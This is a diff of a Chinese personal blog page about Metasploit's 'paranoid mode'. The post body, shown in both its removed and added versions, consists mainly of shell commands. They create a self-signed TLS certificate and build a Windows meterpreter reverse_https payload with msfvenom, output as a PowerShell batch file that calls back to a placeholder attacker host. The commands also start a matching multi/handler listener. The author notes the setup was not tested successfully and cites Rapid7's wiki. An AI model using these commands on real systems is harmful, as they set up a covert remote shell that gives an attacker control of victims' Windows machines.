@@ -6,7 +6,7 @@
 
 <title>metasploit偏执模式 | lowliness9的博客</title>
 
-<link rel="shortcut icon" href="https://lowliness9.github.io/favicon.ico?v=1605289763528">
+<link rel="shortcut icon" href="https://lowliness9.github.io/favicon.ico?v=1605328239264">
 
 <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
 <link rel="stylesheet" href="https://lowliness9.github.io/styles/main.css">
@@ -77,7 +77,7 @@
             
         </div>
         <div style="text-align: center">
-            <form id="gridea-search-form" style="position: relative" data-update="1605289763528" action="/search/index.html">
+            <form id="gridea-search-form" style="position: relative" data-update="1605328239264" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
                 <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
             </form>
@@ -102,22 +102,17 @@
                     
                 </div>
                 <div class="post-content">
-                    <ul>
-<li>
-<p>未测试成功</p>
-</li>
-<li>
-<p>操作代码<br>
-openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj &quot;/C=US/ST=Texas/L=Austin/O=Development/CN=your_ip_or_domain&quot; -keyout your_ip_or_domain.key -out your_ip_or_domain.crt</p>
-<p>cat your_ip_or_domain.key  your_ip_or_domain.crt &gt; your_ip_or_domain.pem</p>
-<p>rm -f your_ip_or_domain.key  your_ip_or_domain.crt</p>
-<p>msfvenom -p windows/meterpreter/reverse_https LHOST=your_ip_or_domain LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/root/msf/your_ip_or_domain.pem StagerVerifySSLCert=true PayloadUUIDName=EmailCampaign20150101 -f psh-cmd -o launch-paranoid.bat</p>
-<p>msfconsole -q -x &quot;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST your_ip_or_domain; set LPORT 443; set HandlerSSLCert /root/msf/your_ip_or_domain.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j&quot;</p>
-</li>
-<li>
-<p><a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode#create-a-ssltls-certificate">参考</a></p>
-</li>
-</ul>
+                    <h3 id="复现结果">复现结果</h3>
+<p>未测试成功，参考网上基本都是差不多一样的文章。</p>
+<h3 id="操作代码">操作代码</h3>
+<pre><code class="language-shell">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj &quot;/C=US/ST=Texas/L=Austin/O=Development/CN=your_ip_or_domain&quot; -keyout your_ip_or_domain.key -out your_ip_or_domain.crt
+cat your_ip_or_domain.key  your_ip_or_domain.crt &gt; your_ip_or_domain.pem
+rm -f your_ip_or_domain.key  your_ip_or_domain.crt
+msfvenom -p windows/meterpreter/reverse_https LHOST=your_ip_or_domain LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/root/msf/your_ip_or_domain.pem StagerVerifySSLCert=true PayloadUUIDName=EmailCampaign20150101 -f psh-cmd -o launch-paranoid.bat
+msfconsole -q -x &quot;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST your_ip_or_domain; set LPORT 443; set HandlerSSLCert /root/msf/your_ip_or_domain.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j&quot;
+</code></pre>
+<h3 id="参考链接">参考链接</h3>
+<p><a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode#create-a-ssltls-certificate">rapid7/metasploit</a></p>
 
                 </div>
             </article>
